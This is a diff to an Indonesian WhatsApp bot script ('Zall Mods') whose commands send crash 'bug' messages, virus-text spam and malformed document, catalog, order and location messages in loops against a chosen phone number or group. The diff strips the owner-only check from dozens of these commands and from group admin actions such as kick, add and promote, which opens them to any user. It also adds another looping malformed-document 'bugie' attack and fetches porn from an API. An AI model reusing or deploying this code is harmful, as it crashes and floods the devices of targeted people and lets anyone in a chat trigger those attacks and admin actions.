@@ -299,7 +299,6 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 break
 //=================================================//
 case 'poll': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -334,7 +333,6 @@ deploy('sukses sendbug')}
 break
 //=================================================//
 case 'jadikatalog': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
@@ -347,7 +345,6 @@ function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=fun
 break
 //=================================================//
 case 'troli2': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return anjay(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -373,7 +370,6 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'santetdia': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
 num = q.split('|')[0]
@@ -419,7 +415,6 @@ m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 break
 //=================================================//
 case 'ducu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -445,7 +440,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'docu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -471,7 +465,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'duc': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -497,7 +490,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'virtext1': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -507,7 +499,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext2': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -527,7 +518,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext4': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -537,7 +527,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext5': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -547,7 +536,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext6': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -557,7 +545,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext7': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -589,7 +576,6 @@ if (isBan) throw sticBanLu(from)
  }
 break
 case 'virtext8': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -599,7 +585,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext9': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -609,7 +594,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 }
 break
 case 'virtext10': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -620,7 +604,6 @@ haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/c2fda8b471c8
 break
 //=================================================//
 case 'bug1': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -646,7 +629,6 @@ haikal.relayMessage(m.chat, audio.message, { messageId: audio.key.id })
 break
 //=================================================//
 case 'bug2': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -675,7 +657,6 @@ haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
 break
 //=================================================//
 case 'bug3': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -702,7 +683,6 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 break
 //=================================================//
 case 'bug4': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -723,7 +703,6 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'bug5': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -748,7 +727,6 @@ haikal.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
 break
 //=================================================//
 case 'bug6': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -771,7 +749,6 @@ haikal.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
 break
 //=================================================//
 case 'bug7': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -789,7 +766,6 @@ haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
 break
 //=================================================//
 case 'lokas': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -811,7 +787,6 @@ haikal.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.
 break
 //=================================================//
 case 'buglokas': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -832,7 +807,6 @@ haikal.relayMessage(m.chat, location.message, { messageId: location.key.id })
 break
 //=================================================//
 case 'buginvite': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -855,7 +829,6 @@ haikal.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id
 break
 //=================================================//
 case 'troli': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -884,7 +857,6 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 break
 //=================================================//
 case 'catalog': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -916,7 +888,6 @@ haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
 break
 //=================================================//
 case 'catalogpc': case 'cataloggc':  {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
 num = q.split('|')[0]
@@ -948,7 +919,6 @@ m.reply(tekteka)
 break
 //=================================================//
 case 'jagoanom' : {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -967,7 +937,6 @@ break
 //=================================================//
 /*BUG WACAP */
 case 'ampas1' : {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
@@ -993,7 +962,6 @@ break
 /*BUG WACAP */
 case 'ampas2' : {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
 a = await haikal.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 haikal.sendMessage(Pe, {text: `${buttonkal}`}, {quoted: doc})
@@ -1054,7 +1022,6 @@ m.reply(`${m.pushName} Hello Saya Bot Zall Mods${text ? ': ' + text : ''}`)
 break
 //=================================================//
 case 'bugstik':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1098,7 +1065,35 @@ haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${com
 break
 //=================================================//
 case 'bugie':{
-if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Zall Mods`
+for (let i = 0; i < jumlah; i++) {
+haikal.sendMessage(m.chat, {document: thumb},{quoted: {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `ZALL MODS WA${ngazap(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
+}
+}
+}})
+}
+deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
+}
+break
+//=================================================//
+case 'kontol':{
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1185,7 +1180,6 @@ m.reply('*Success Broadcast*')
 break
 //=================================================//
 case 'buttonampas':
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1207,7 +1201,6 @@ haikal.sendMessage(m.chat, buttonMessage)
  break
 //=================================================//
 case 'bugtag': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 haikal.sendMessage(m.chat, { text : `${buttonkal}` , mentions: participants.map(a => a.id)}, { quoted: doc })
@@ -1216,7 +1209,6 @@ break
 //=================================================//
 case 'hiya':{
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Zall Mods`
@@ -1228,7 +1220,6 @@ haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-strea
 break
 //=================================================//
 case 'bugtod': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1241,7 +1232,6 @@ haikal.sendContact(m.chat, global.ownerr, fkontaak)
 break
 //=================================================//
 case 'bugbokep':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1328,7 +1318,6 @@ break
 //=================================================//
 case 'jadibug1': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
 let media = await quoted.download()
@@ -1340,7 +1329,6 @@ break
 //=================================================//
 case 'jadibug2': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
 if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
@@ -1352,7 +1340,6 @@ haikal.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `
 break
 //=================================================//
 case 'jadibug3': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
 if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
@@ -1366,7 +1353,6 @@ break
 //=================================================//
 case 'jadibug4': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (!quoted) throw 'Reply Image'
 if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
 let media = await haikal.downloadAndSaveMediaMessage(quoted)
@@ -1382,7 +1368,6 @@ fs.unlinkSync(ran)
 break
 //=================================================//
 case 'jadibug5': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image'
 if (/image/.test(mime)) {
@@ -1396,7 +1381,6 @@ haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
 break
 //=================================================//
 case 'hu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1409,7 +1393,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'hi': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1422,7 +1405,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ha': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1435,7 +1417,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'he': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1448,7 +1429,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ba': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1461,7 +1441,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'be': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1475,7 +1454,6 @@ for (let i = 0; i < jumlah; i++) {
 //=================================================//
 case 'bu': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Zall Mods`
@@ -1488,7 +1466,6 @@ for (let i = 0; i < jumlah; i++) {
 //=================================================//
 case 'bi': {
 if (isBan) throw sticBanLu(from)
-if (!isCreator) return
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Zall Mods`
@@ -1500,7 +1477,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ca': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1513,7 +1489,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ci': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1526,7 +1501,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'cu': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1539,7 +1513,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'co': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
@@ -1552,7 +1525,6 @@ for (let i = 0; i < jumlah; i++) {
  break
 //=================================================//
 case 'ban': case 'banned': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!args[0]) return m.reply(`*Enter Option Select add or delete*`)
 if (args[1]) {
@@ -2254,7 +2226,6 @@ haikal.sendMessage(from, reactionMessage)
 break
 //=================================================//
 case 'join': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!text) throw 'Masukkan Link Group!'
 if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
@@ -2264,7 +2235,6 @@ await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).c
 break
 //=================================================//
 case 'keluar': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 await haikal.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
 }
@@ -2280,7 +2250,6 @@ reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Au
 break
 //=================================================//
 case 'kick': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2291,7 +2260,6 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.
 break
 //=================================================//
 case 'add': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2302,7 +2270,6 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.rep
 break
 //=================================================//
 case 'promote': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2313,7 +2280,6 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m
 break
 //=================================================//
 case 'demote': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!m.isGroup) throw groupon(from)
 if (!isBotAdmins) throw SiGroupadmin(from)
@@ -2324,7 +2290,6 @@ await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.
 break
 //=================================================//
 case 'block': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -2332,7 +2297,6 @@ await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(
 break
 //=================================================//
 case 'unblock': {
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
@@ -3946,7 +3910,6 @@ m.reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :
 break
 //=================================================//
 case 'bokep':{
-if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
 haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: m })
@@ -4196,94 +4159,107 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┃╭─────────⩵꙰ཱི࿐
 ┃╰─ ⏤͟͟͞MENU NYA ─➤ ↶↷
 ╰━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━͙✩̣̣̣̣
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── SPECIAL BUG ──❏ 
-𖠀⩵꙰ཱི➢ afk { kasih reactions }
-𖠀⩵꙰ཱི➢ bugghoib [ on / off ]
-𖠀⩵꙰ཱི➢ jagoanom [ reply target ]
-𖠀⩵꙰ཱི➢ bugsange [ Harus Menjadi Admin ]
-𖠀⩵꙰ཱི➢ bugtiktok [ Link ] - Bug Sw
-𖠀⩵꙰ཱི➢ jadikatalog [ reply sticker ] jumlah
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── OTW TARGET ──❏ 
-𖠀⩵꙰ཱི➢ 🔥 628xxx|5|5
-𖠀⩵꙰ཱི➢ ampas1 628xxx
-𖠀⩵꙰ཱི➢ santetdia 628xxx@s.whatsapp.net|10|10s
-𖠀⩵꙰ཱི➢ catalogpc 628xxx@s.whatsapp.net|10|10s
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── OTW GROUP ──❏ 
-𖠀⩵꙰ཱི➢ Ketik > m.chat ( di group dulu🌷)
-𖠀⩵꙰ཱི➢ ampas2 112674448xxx
-𖠀⩵꙰ཱི➢ santetgc  1237891xxxx@g.us|10|10s
-𖠀⩵꙰ཱི➢ cataloggc 1237891xxxx@g.us|10|10s
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── VIRTEX SPAM ──❏ 
-𖠀⩵꙰ཱི➢ virtext1 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext2 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext3 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext4 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext5 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext6 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext7 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext8 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext9 [ jumlah ]
-𖠀⩵꙰ཱི➢ virtext10 [ jumlah ]
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
-❏ ── BUG SPAM ──❏ 
-𖠀⩵꙰ཱི➢ 🌷 [ jumlah ]
-𖠀⩵꙰ཱི➢ bugstik [ jumlah ]
-𖠀⩵꙰ཱི➢ bugie [ jumlah ]
-𖠀⩵꙰ཱི➢ buglokas [ jumlah ]
-𖠀⩵꙰ཱི➢ bugtod [ jumlah ]
-𖠀⩵꙰ཱི➢ bugbokep [ jumlah ]
-𖠀⩵꙰ཱི➢ buginvite [ jumlah ] Pc
-𖠀⩵꙰ཱི➢ ha [ jumlah ]
-𖠀⩵꙰ཱི➢ hi [ jumlah ]
-𖠀⩵꙰ཱི➢ hu [ jumlah ]
-𖠀⩵꙰ཱི➢ he [ jumlah ]
-𖠀⩵꙰ཱི➢ ba [ jumlah ]
-𖠀⩵꙰ཱི➢ be [ jumlah ]
-𖠀⩵꙰ཱི➢ bu [ jumlah ]
-𖠀⩵꙰ཱི➢ bi [ jumlah ]
-𖠀⩵꙰ཱི➢ ca [ jumlah ]
-𖠀⩵꙰ཱི➢ ci [ jumlah ]
-𖠀⩵꙰ཱི➢ cu [ jumlah ]
-𖠀⩵꙰ཱི➢ co [ jumlah ]
-𖠀⩵꙰ཱི➢ bug1 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug2 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug3 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug4 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug5 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug6 [ jumlah ]
-𖠀⩵꙰ཱི➢ bug7 [ jumlah ]
-𖠀⩵꙰ཱི➢ poll [ jumlah ]
-𖠀⩵꙰ཱི➢ bugtag [ jumlah ]
-𖠀⩵꙰ཱི➢ inibug [ jumlah ]
-𖠀⩵꙰ཱི➢ buttonampas [ jumlah ]
-𖠀⩵꙰ཱི➢ hiya [ jumlah ]
-𖠀⩵꙰ཱི➢ lokas [ jumlah ]
-𖠀⩵꙰ཱི➢ catalog [ jumlah ]
-𖠀⩵꙰ཱི➢ docu [ jumlah ]
-𖠀⩵꙰ཱི➢ daca [ jumlah ]
-𖠀⩵꙰ཱི➢ duc [ jumlah ]
-𖠀⩵꙰ཱི➢ ducu [ jumlah ]
-𖠀⩵꙰ཱི➢ troli [ jumlah ]
-𖠀⩵꙰ཱི➢ troli2 [ jumlah ]
-𖠀⩵꙰ཱི➢ spam [ Reply Pesan ]
-[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]
